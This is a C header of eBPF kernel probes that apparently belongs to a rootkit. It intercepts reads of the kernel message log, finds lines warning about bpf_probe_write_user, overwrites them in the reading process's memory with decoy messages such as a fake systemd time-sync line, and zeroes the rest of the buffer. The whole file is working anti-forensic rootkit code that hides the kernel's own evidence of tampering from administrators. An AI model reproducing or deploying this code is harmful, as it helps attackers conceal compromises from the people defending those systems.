#ifndef __KMSG_USER_H
#define __KMSG_USER_H

#include <linux/kconfig.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <linux/version.h>

#include "include/bpf.h"
#include "include/bpf_helpers.h"

#include "common.h"
#include "hash.h"

SEC("kprobe/fill_with_zero")
int fill_with_zero(struct pt_regs *ctx)
{
    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr)
    {
        return 0;
    }

    const char c = '\0';

#pragma unroll
    for (int i = 0; i != 256; i++)
    {
        if (i == fd_attr->read_size - 1)
        {
            break;
        }
        bpf_probe_write_user(fd_attr->read_buf + i, &c, 1);
    }

    return 0;
}

SEC("kprobe/kmsg")
int kmsg(struct pt_regs *ctx)
{
    int retval = PT_REGS_RC(ctx);

    u64 pid_tgid = bpf_get_current_pid_tgid();
    struct rk_file_t *file = (struct rk_file_t *)bpf_map_lookup_elem(&rk_files, &pid_tgid);
    if (!file)
    {
        return 0;
    }

    struct rk_fd_key_t fd_key = {
        .fd = file->fd,
        .pid = pid_tgid >> 32,
    };

    struct rk_fd_attr_t *fd_attr = (struct rk_fd_attr_t *)bpf_map_lookup_elem(&rk_fd_attrs, &fd_key);
    if (!fd_attr || !fd_attr->read_buf)
    {
        return 0;
    }

    char buf[128];
    bpf_probe_read(buf, sizeof(buf), fd_attr->read_buf);

    u8 o1 = 0;
    u64 hash = 0;

#pragma unroll
    for (int i = 0; i != 128; i++)
    {
        if (buf[i] == ';' && !o1)
        {
            hash = FNV_BASIS;
            o1 = i + 1;
            continue;
        }
        else if (buf[i] == ' ')
        {
            hash = FNV_BASIS;
            continue;
        }
        update_hash_byte(&hash, buf[i]);

        // `bpf_probe_write_user` hash or `bpf_get_probe_write_proto`
        if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
        {
            break;
        }
    }

    //systemd[1]: Resync Network Time Service.

    if (hash == 0xada8e5f3e94cf1f8 || hash == 0x55c7edee212d1ef4)
    {
        int key = fd_attr->kmsg % 30;
        struct kmsg_t *kmsg = (struct kmsg_t *)bpf_map_lookup_elem(&rk_kmsg, &key);
        if (!kmsg) {
            return 0;
        }
        fd_attr->kmsg++;

        bpf_probe_write_user(fd_attr->read_buf + o1, kmsg->str, sizeof(kmsg->str) - 1);

        fd_attr->read_buf += o1 + sizeof(kmsg->str) - 1;
        fd_attr->read_size = retval - (o1 + sizeof(kmsg->str) - 1);

        bpf_tail_call(ctx, &rk_progs, FILL_WITH_ZERO_PROG);
    }

    return 0;
}

#endif